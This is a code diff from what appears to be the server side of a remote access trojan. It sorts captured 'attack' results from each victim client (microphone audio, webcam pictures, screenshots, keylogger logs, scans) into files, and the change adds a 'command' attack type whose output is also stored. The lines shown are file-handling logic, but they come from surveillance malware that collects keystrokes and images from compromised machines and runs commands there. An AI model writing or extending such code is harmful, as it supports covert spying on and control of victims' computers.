@@ -287,7 +287,7 @@ def start_server(port, logger):
                             result_file_name = "results/" + str(attack_type) + "/" + str(client['uid']) + "/" + str(attack_id) + ".wav"
                         elif attack_type == "picture" or attack_type == "screenshot" or attack_type == "monitor":
                             result_file_name = "results/" + str(attack_type) + "/" + str(client['uid']) + "/" + str(attack_id) + ".png"
-                        elif attack_type == "scan" or attack_type == "keylogger":
+                        elif attack_type == "scan" or attack_type == "keylogger" or attack_type == "command":
                             result_file_name = "results/" + str(attack_type) + "/" + str(client['uid']) + "/" + str(attack_id) + ".txt"
                         
                         # Ecriture du résultat dans le fichier
